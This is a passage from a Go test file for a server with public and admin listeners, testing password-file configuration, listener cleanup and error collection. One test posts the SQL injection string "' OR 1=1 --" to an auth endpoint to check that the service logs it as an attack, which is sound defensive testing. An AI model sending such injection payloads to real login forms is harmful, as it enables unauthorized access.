		{name: "both sources", password: "sixteen-byte-key!", passwordFile: validPath},
		{name: "missing file", passwordFile: filepath.Join(temporaryDirectory, "missing-password")},
		{name: "oversized file", passwordFile: oversizedPath},
	}
	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			t.Setenv(envAdminAddr, ":9090")
			t.Setenv(envAdminPassword, test.password)
			t.Setenv(envAdminPasswordFile, test.passwordFile)
			if _, err := loadConfig(); err == nil {
				t.Fatal("loadConfig() unexpectedly accepted invalid password file settings")
			}
		})
	}
}

// trackingListener records whether startup cleanup closed it
type trackingListener struct {
	address net.Addr
	mu      sync.Mutex
	closed  bool
}

// Accept is not used in startup failure tests
func (listener *trackingListener) Accept() (net.Conn, error) {
	return nil, errors.New("accept is unavailable in test listener")
}

// Close records cleanup without touching a real socket
func (listener *trackingListener) Close() error {
	listener.mu.Lock()
	listener.closed = true
	listener.mu.Unlock()
	return nil
}

// Addr identifies the synthetic listener
func (listener *trackingListener) Addr() net.Addr {
	return listener.address
}

// Read the listener state without racing lifecycle code
func (listener *trackingListener) wasClosed() bool {
	listener.mu.Lock()
	defer listener.mu.Unlock()
	return listener.closed
}

// staticAddr is a small net.Addr for lifecycle tests
type staticAddr string

// Network reports the test transport
func (address staticAddr) Network() string { return "test" }

// String distinguishes public and admin listeners
func (address staticAddr) String() string { return string(address) }

// Close the first listener when the second bind fails
func TestRunClosesFirstListenerWhenSecondBindFails(t *testing.T) {
	publicListener := &trackingListener{address: staticAddr("public")}
	bindError := errors.New("admin bind failed")
	calls := 0
	dependencies := runtimeDependencies{
		listen: func(_, _ string) (net.Listener, error) {
			calls++
			if calls == 1 {
				return publicListener, nil
			}
			return nil, bindError
		},
		serve: func(*http.Server, net.Listener) error {
			t.Fatal("serve called after partial startup")
			return nil
		},
	}

	err := runWithDependencies(context.Background(), appConfig{publicAddr: ":0", adminAddr: ":0"}, dependencies)
	if !errors.Is(err, bindError) {
		t.Fatalf("run error = %v, want bind error", err)
	}
	if !publicListener.wasClosed() {
		t.Fatal("public listener remained open after admin bind failure")
	}
}

// Collect both server errors during shutdown
func TestRunCollectsBothServerErrors(t *testing.T) {
	publicError := errors.New("public server failed")
	adminError := errors.New("admin server failed")
	listeners := []net.Listener{
		&trackingListener{address: staticAddr("public")},
		&trackingListener{address: staticAddr("admin")},
	}
	listenIndex := 0
	dependencies := runtimeDependencies{
		listen: func(_, _ string) (net.Listener, error) {
			listener := listeners[listenIndex]
			listenIndex++
			return listener, nil
		},
		serve: func(_ *http.Server, listener net.Listener) error {
			if listener.Addr().String() == "public" {
				return publicError
			}
			return adminError
		},
	}

	err := runWithDependencies(context.Background(), appConfig{publicAddr: ":0", adminAddr: ":0"}, dependencies)
	if !errors.Is(err, publicError) || !errors.Is(err, adminError) {
		t.Fatalf("run error = %v, want both server errors", err)
	}
}

// Inspect authentication payloads even when access is rejected
func TestAPIV1AuthStillInspectsPayload(t *testing.T) {
	resetRecentLogs(t)
	request := httptest.NewRequest(http.MethodPost, "http://example.test/api/v1/auth", strings.NewReader("username=' OR 1=1 --&password=x"))
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	response := httptest.NewRecorder()
	publicHandler().ServeHTTP(response, request)

	if response.Code != http.StatusUnauthorized {
		t.Fatalf("status = %d, want %d", response.Code, http.StatusUnauthorized)
	}
	logMutex.Lock()
	defer logMutex.Unlock()
	if len(recentLogs) != 1 || recentLogs[0].AttackType != "SQL Injection" || recentLogs[0].Confidence != confidenceHigh {
		t.Fatalf("login payload telemetry = %+v, want one high-confidence SQL event", recentLogs)
	}
}
